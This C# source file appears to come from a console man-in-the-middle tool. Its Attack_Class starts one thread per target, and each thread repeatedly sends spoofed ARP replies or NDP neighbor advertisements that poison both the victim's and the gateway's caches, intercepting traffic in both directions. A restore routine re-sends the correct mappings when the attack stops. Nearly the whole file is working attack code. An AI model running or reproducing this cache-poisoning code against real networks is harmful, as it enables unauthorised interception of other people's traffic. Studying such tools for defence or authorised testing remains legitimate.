using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net.Sockets;

class Attack_Class
{
    //--Classes
    private Ndp_Class? ndp;

    //--Variables
    private LibPcapLiveDevice? liveDevice;
    private readonly List<Thread> threadList = new List<Thread>();

    // Targets currently being attacked, remembered so their poisoned caches can be repaired on stop.
    private readonly List<Target_Class> activeTargets = new List<Target_Class>();

    // How many corrective packets to send per target when healing, and the gap between them.
    private const int RestoreRounds = 5;
    private const int RestoreDelayMs = 100;

    /// <summary>
    /// Indicates whether an attack is active. Marked volatile because it is
    /// written by the UI thread (<see cref="ForceStop"/>) and read by every
    /// worker thread.
    /// </summary>
    private volatile bool scanStatus = false;

    /// <summary>
    /// Starts one worker thread per target, emitting spoofed ARP replies
    /// (IPv4) or NDP neighbor advertisements (IPv6) until <see cref="ForceStop"/>
    /// is called.
    /// </summary>
    public void StartAttack(LibPcapLiveDevice? pLiveDevice, TargetList_Class pTargetList)
    {
        if (pLiveDevice == null)
        {
            Console.WriteLine("#> No network adapter configured. Choose one with [1] first. Press \"ENTER\".");
            Console.ReadLine();
            return;
        }

        if (scanStatus)
        {
            Console.WriteLine("#> An attack is already running. Use [5] Force Stop first. Press \"ENTER\".");
            Console.ReadLine();
            return;
        }

        if (pTargetList.GetLength() == 0)
        {
            Console.WriteLine("#> No targets defined. Add some with [2] first. Press \"ENTER\".");
            Console.ReadLine();
            return;
        }

        liveDevice = pLiveDevice;
        ndp = new Ndp_Class(pLiveDevice.MacAddress);
        scanStatus = true;

        foreach (Target_Class target in pTargetList.GetTargetList())
        {
            // Skip targets whose address resolution failed - sending with a
            // null MAC would throw inside the worker and kill the thread.
            if (!target.IsComplete())
            {
                Console.WriteLine("#> Skipping incomplete target {0} (unresolved address).", target.t_ipAddr);
                continue;
            }

            Thread thread = target.t_ipAddr!.AddressFamily switch
            {
                AddressFamily.InterNetwork => new Thread(() => ArpThreadMethod(target)),
                AddressFamily.InterNetworkV6 => new Thread(() => NdpThreadMethod(target)),
                _ => null!
            };

            if (thread == null)
            {
                continue;
            }

            thread.IsBackground = true;
            thread.Start();
            threadList.Add(thread);
            activeTargets.Add(target);
        }

        if (threadList.Count == 0)
        {
            scanStatus = false;
            Console.WriteLine("#> No valid targets to attack. Press \"ENTER\".");
            Console.ReadLine();
        }
    }

    /// <summary>
    /// Continuously sends two ARP replies: one poisoning the target's cache and
    /// one poisoning the gateway's cache (bidirectional interception).
    /// </summary>
    private void ArpThreadMethod(Target_Class pTarget)
    {
        Packet arpReplyToTarget = Arp_Class.BuildArpPacket(pTarget.t_ipAddr!, pTarget.s_ipAddr!, pTarget.t_phAddr!, liveDevice!);
        Packet arpReplyToGateway = Arp_Class.BuildArpPacket(pTarget.s_ipAddr!, pTarget.t_ipAddr!, pTarget.s_phAddr!, liveDevice!);

        while (scanStatus)
        {
            try
            {
                liveDevice!.SendPacket(arpReplyToTarget);
                liveDevice!.SendPacket(arpReplyToGateway);
            }
            catch (Exception ex)
            {
                Console.WriteLine("#> ARP send failed: {0}", ex.Message);
                break;
            }
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// Continuously sends two NDP neighbor advertisements: one poisoning the
    /// target's neighbor cache and one poisoning the gateway's.
    /// </summary>
    private void NdpThreadMethod(Target_Class pTarget)
    {
        byte[] ndpToTarget = ndp!.BuildNeighborAdvertisement(pTarget.t_ipAddr!, pTarget.s_ipAddr!, pTarget.t_phAddr!);
        byte[] ndpToGateway = ndp!.BuildNeighborAdvertisement(pTarget.s_ipAddr!, pTarget.t_ipAddr!, pTarget.s_phAddr!);

        while (scanStatus)
        {
            try
            {
                liveDevice!.SendPacket(ndpToTarget);
                liveDevice!.SendPacket(ndpToGateway);
            }
            catch (Exception ex)
            {
                Console.WriteLine("#> NDP send failed: {0}", ex.Message);
                break;
            }
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// Signals every worker to stop and waits for them to finish. Replaces the
    /// old <c>Thread.Abort()</c>, which throws <see cref="PlatformNotSupportedException"/>
    /// on modern .NET (and therefore crashed on Linux).
    /// </summary>
    public void ForceStop()
    {
        scanStatus = false;

        foreach (Thread item in threadList)
        {
            if (item.IsAlive)
            {
                item.Join(TimeSpan.FromSeconds(2));
            }
        }
        threadList.Clear();

        RestoreNetwork();
        activeTargets.Clear();
    }

    /// <summary>
    /// Repairs the ARP/NDP caches poisoned during the attack by broadcasting the <i>correct</i> mappings,
    /// so the victim and gateway relearn each other's real MAC immediately instead of losing connectivity
    /// until the stale entry times out. Sending truthful packets only; best-effort and never fatal.
    /// </summary>
    private void RestoreNetwork()
    {
        if (liveDevice == null || activeTargets.Count == 0)
        {
            return;
        }

        for (int round = 0; round < RestoreRounds; round++)
        {
            foreach (Target_Class target in activeTargets)
            {
                try
                {
                    if (target.t_ipAddr!.AddressFamily == AddressFamily.InterNetwork)
                    {
                        // Tell the victim the gateway's real MAC, and the gateway the victim's real MAC.
                        liveDevice.SendPacket(Arp_Class.BuildCorrectiveArpReply(target.s_ipAddr!, target.s_phAddr!, target.t_ipAddr!, target.t_phAddr!));
                        liveDevice.SendPacket(Arp_Class.BuildCorrectiveArpReply(target.t_ipAddr!, target.t_phAddr!, target.s_ipAddr!, target.s_phAddr!));
                    }
                    else if (ndp != null)
                    {
                        liveDevice.SendPacket(ndp.BuildNeighborAdvertisement(target.t_ipAddr!, target.s_ipAddr!, target.t_phAddr!, target.s_phAddr));
                        liveDevice.SendPacket(ndp.BuildNeighborAdvertisement(target.s_ipAddr!, target.t_ipAddr!, target.s_phAddr!, target.t_phAddr));
                    }
                }
                catch (Exception)
                {
                    // The link may already be down; healing is best-effort.
                }
            }

            Thread.Sleep(RestoreDelayMs);
        }
    }

    public int GetThreadCount()
    {
        return threadList.Count;
    }
}
